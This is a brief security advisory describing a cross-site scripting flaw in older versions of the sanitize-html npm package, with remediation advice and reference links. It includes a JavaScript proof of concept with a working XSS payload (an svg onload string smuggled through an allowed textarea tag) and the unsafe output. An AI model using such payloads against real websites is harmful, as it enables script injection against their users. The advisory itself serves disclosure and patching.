## Overview
[`sanitize-html`](https://www.npmjs.com/package/sanitize-html) is a library for scrubbing html input of malicious values.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) attacks. If at least one `nonTextTags` tag is allowed, a malicious user may potentially conduct an XSS attack.
**PoC:**
```js
var sanitizeHtml = require('sanitize-html');

var dirty = '!<textarea>&lt;/textarea&gt;<svg/onload=prompt`xs`&gt;</textarea>!';
var clean = sanitizeHtml(dirty, {
    allowedTags: [ 'textarea' ]
});

console.log(clean);

// !<textarea></textarea><svg/onload=prompt`xs`></textarea>!
```

## Remediation
Upgrade `sanitize-html` to version 1.11.4 or later.

## References
- [Github Issue](https://github.com/punkave/sanitize-html/issues/100)
- [Github Commit](https://github.com/punkave/sanitize-html/commit/5d205a1005ba0df80e21d8c64a15bb3accdb2403)
